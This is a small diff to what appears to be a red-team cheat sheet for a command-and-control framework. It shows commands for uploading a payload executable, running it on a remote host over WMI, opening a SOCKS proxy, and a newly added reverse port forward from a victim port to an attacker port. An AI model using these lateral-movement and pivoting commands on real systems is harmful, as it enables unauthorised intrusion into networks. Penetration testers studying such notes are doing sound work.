@@ -323,9 +323,13 @@ upload C:\Payloads\smb_x64.exe
 remote-exec wmi PC C:\Windows\smb_x64.exe
 ```
 # Pivoting
-Usar socks
+## socks
 ```
 socks 1080
+```
+## Reverse Port Forwarding
+```
+rportfwd victim_port 127.0.0.1 attacker_port
 ```
 # Kerberos
 
